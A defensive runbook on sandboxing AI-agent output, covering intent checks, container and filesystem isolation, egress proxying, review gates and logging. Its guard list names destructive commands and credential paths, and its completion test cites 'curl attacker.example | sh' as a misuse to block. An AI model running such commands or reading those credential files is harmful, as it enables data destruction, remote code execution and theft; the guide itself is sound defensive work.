# Routine — Sandboxing agent-produced output

If an agent produces code, shell commands, or configuration, you will
eventually execute them. Where you execute them decides whether a
successful injection costs you an apology or a breach.

## When to apply

- Agent produces shell commands that will be run.
- Agent produces code that will be compiled/executed.
- Agent produces SQL that will hit a database.
- Agent writes files that another agent or human will act on.

## Layered sandbox

### Layer 1 — Intent check

Before execution, have a secondary guard (rules or a separate model
call) check for:

- Destructive operations (`rm -rf`, `DROP DATABASE`).
- Network egress to unexpected hosts.
- Credential file access (`.aws/`, `.ssh/`, `id_rsa`).
- Privilege escalation (`sudo`, `setuid`).

Fail closed: if the guard is uncertain, route to a human.

### Layer 2 — Process sandbox

Run inside a container with:

- Read-only root filesystem; writable scratch under `/tmp`.
- No network, unless explicitly allowed, via network policy (not
  firewall rules inside the container).
- `--cap-drop=ALL` plus seccomp default profile.
- Non-root user (UID ≥ 10000).
- CPU + memory quota that fails the job rather than the host.
- Time limit (hard-kill at T+N seconds).

### Layer 3 — Filesystem isolation

Mount only what the agent needs:

- `/workspace` — ephemeral, destroyed after run.
- `/inputs` (read-only) — the fixture the agent is operating on.
- `/outputs` — where the agent writes the artefacts it produces.

Nothing else. No home directory, no host configs.

### Layer 4 — Egress mediation

If the agent legitimately needs to fetch (e.g. package installs),
route through a caching proxy that:

- Allow-lists registries (npm, PyPI, etc.).
- Caches responses (repeatability).
- Logs every request (audit trail).

### Layer 5 — Artifact review

Before outputs land in a trusted location, they pass a review gate:

- Diff-based review for code.
- Schema validation for data.
- Signature check for anything that will be executed
  downstream.

## Specific recipes

### Shell: `firejail` or `bwrap`

```bash
firejail \
  --private \
  --net=none \
  --caps.drop=all \
  --seccomp \
  --rlimit-cpu=60 \
  --rlimit-as=$((512*1024*1024)) \
  bash -c "$AGENT_COMMAND"
```

### Container: minimal Dockerfile

```dockerfile
FROM alpine:3.20
RUN addgroup -g 10001 agent && adduser -u 10001 -G agent -D -H agent
USER agent
WORKDIR /workspace
ENTRYPOINT ["/bin/sh", "-c"]
```

Run with `--read-only --network=none --security-opt=no-new-privileges`.

### SQL: prepared statements + role restriction

Agent-generated SQL runs under a DB role that has `SELECT` but no
`INSERT`/`UPDATE`/`DELETE`/`DDL`. For write paths, the agent emits
structured operations, not raw SQL.

## Observability

Log every execution with:

- The exact command/code executed.
- The sandbox profile applied.
- stdout/stderr, truncated.
- Exit code + wall time.
- Resource peaks (CPU, memory).

Store for ≥ 90 days. These logs are your forensics trail.

## Done when

- Agent execution paths all run inside a sandbox.
- A deliberate misuse attempt (e.g. `curl attacker.example | sh`)
  is blocked by layer 1 or contained by layer 2.
- Execution logs are retained and queryable.
